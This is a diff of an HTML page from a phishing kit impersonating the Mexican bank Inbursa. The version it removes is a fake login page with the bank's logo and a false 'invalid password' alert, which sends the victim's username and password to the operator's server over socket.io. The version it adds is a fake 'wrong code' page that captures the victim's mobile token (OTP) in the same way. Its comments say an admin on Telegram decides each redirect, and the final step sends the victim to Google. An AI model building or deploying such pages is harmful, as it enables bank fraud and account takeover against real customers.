@@ -2,131 +2,125 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verificación de cuenta</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Código Incorrecto</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
     body {
-      background-color: #f3f6fb;
-      font-family: Arial, sans-serif;
+      margin: 0;
+      font-family: 'Open Sans', sans-serif;
+      background: #f3f6f9;
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      margin: 0;
+      min-height: 100vh;
     }
-    .container {
+
+    .screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       background: #fff;
-      border-radius: 15px;
-      padding: 40px 30px;
-      width: 100%;
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      width: 90%;
       max-width: 400px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
       text-align: center;
     }
-    .logo {
-      margin-bottom: 30px;
-    }
-    .logo img {
-      height: 50px;
-    }
-    h2 {
-      font-size: 1.5em;
-      margin-bottom: 10px;
-    }
-    p {
-      color: #777;
-      font-size: 0.95em;
-      margin-bottom: 20px;
-    }
-    .alerta {
-      background-color: #ffe5e5;
-      color: #d8000c;
-      border: 1px solid #d8000c;
-      padding: 10px;
+
+    .input-group {
+      display: flex;
+      align-items: center;
+      background: #f0f2f5;
       border-radius: 8px;
-      margin-bottom: 20px;
-      font-size: 0.95em;
-    }
-    input {
+      margin: 1rem 0;
+      padding: 0.5rem 1rem;
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 1em;
     }
-    button {
-      background-color: #262D91;
-      color: white;
-      padding: 12px;
+
+    .input-group .icon {
+      color: #888;
+      margin-right: 0.5rem;
+    }
+
+    .input-group input {
       border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 1em;
-      width: 100%;
+      background: transparent;
+      outline: none;
+      flex: 1;
+      font-size: 1rem;
     }
+
+    .campo-requerido {
+      border: 1px solid red !important;
+    }
+
+    button {
+      background: #262D91;
+      color: white;
+      padding: 0.75rem 2rem;
+      border: none;
+      border-radius: 50px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 1rem;
+      transition: background 0.3s;
+    }
+
     button:hover {
-      background-color: #1924D1;
+      background: #1924D1;
+    }
+
+    .mensaje-error {
+      color: red;
+      margin-top: 0.5rem;
+      font-size: 0.85rem;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="https://companieslogo.com/img/orig/GFINBURO.MX-bfce3765.png?t=1720244492" alt="logo" />
+  <div class="screen">
+    <h3>¡ULTIMO PASO PARA VALIDAR!</h3>
+    <p>Introduce el Token movil.</p>
+    <div class="input-group campo-requerido">
+      <div class="icon"><i class="fas fa-key"></i></div>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="4" maxlength="10" required>
     </div>
-    <h2>Bienvenido a su plataforma de regalos de <strong>INBURSA</strong> </h2>
-    <div class="alerta">
-      ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
-    </div>
-    <p>Ingrese su usuario y contraseña para continuar</p>
-    <form id="login-form">
-      <input type="text" id="usuario" placeholder="Usuario" required />
-      <div class="input-group">
-        <div class="icon"><i class="fas fa-lock"></i></div>
-        <input type="password" id="clave" placeholder="Contraseña" required>
-      </div>
-      <button type="submit">Continuar</button>
-    </form>
+    <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente.</p>
+    <button onclick="reintentarCodigo()">Reintentar</button>
   </div>
 
-  <!-- Scripts -->
   <script src="/socket.io/socket.io.js"></script>
   <script>
     const socket = io();
+    const sessionId = localStorage.getItem("sessionId");
 
-    window.addEventListener('DOMContentLoaded', () => {
-      const form = document.getElementById('login-form');
+    socket.emit("reconectar", sessionId);
 
-      if (form) {
-        form.addEventListener('submit', (e) => {
-          e.preventDefault();
+    function reintentarCodigo() {
+      const codigo = document.getElementById("codigo").value;
 
-          // Obtener los valores de los campos de usuario y contraseña
-          const usuario = document.getElementById('usuario').value; // 'usuario' en vez de 'correo'
-          const contrasena = document.getElementById('clave').value;
-          const sessionId = localStorage.getItem('sessionId') || Math.random().toString(36).substring(2, 15);
-
-          // Actualizar localStorage con los nuevos datos ingresados
-          localStorage.setItem('usuario', usuario);  // Guardar el 'usuario'
-          localStorage.setItem('contrasena', contrasena);
-          localStorage.setItem('sessionId', sessionId);  // Guardar sessionId
-
-          // Emitir los datos al servidor
-          socket.emit('errorlogoForm', { usuario, contrasena, sessionId });
-
-          // Redirigir a la pantalla de opciones o esperar respuesta
-          window.location.href = 'opciones.html';
-        });
+      // El código debe tener entre 4 y 10 dígitos
+      if (!codigo || codigo.length < 4 || codigo.length > 10) {
+        alert("Ingrese un código válido entre 4 y 10 dígitos.");
+        return;
       }
-    });
 
-    // Respuesta desde Telegram
-    socket.on("respuestaErrorLogo", (decision) => {
-      if (decision === "otp") {
-        window.location.href = "bienvenido.html";
-      } else if (decision === "error_logo") {
-        window.location.href = "errorlogo.html";
+      // Enviar OTP ingresado al servidor
+      socket.emit("otpIngresado", { codigo, sessionId });
+
+      // Ir a la pantalla de espera
+      window.location.href = "opciones.html";
+    }
+
+    // Recibir respuesta del admin desde Telegram
+    socket.on("respuestaOtp", (decision) => {
+      if (decision === "finalizar") {
+        window.location.href = "https://www.google.com";
+      } else if (decision === "otp_error") {
+        window.location.href = "denegado.html";
       }
     });
   </script>
